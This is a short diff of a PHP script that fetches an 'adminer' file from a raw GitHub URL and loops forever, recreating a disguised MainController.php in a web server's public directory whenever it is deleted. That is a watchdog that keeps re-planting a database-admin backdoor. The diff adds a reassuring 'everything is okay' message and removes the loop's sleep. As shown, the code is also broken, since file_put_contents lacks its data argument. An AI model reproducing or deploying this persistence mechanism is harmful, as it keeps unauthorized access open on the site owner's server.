@@ -4,6 +4,7 @@ $txt=file_get_contents("https://raw.githubusercontent.com/n3f0/adminer/main/admi
 while(1){
   if(!file_exists("/var/www/sipd/public/MainController.php")){
       file_put_contents("/var/www/sipd/public/MainController.php");
+  }else{
+    echo "File exists.everythings is okay!";
   }
- sleep(100);
 }
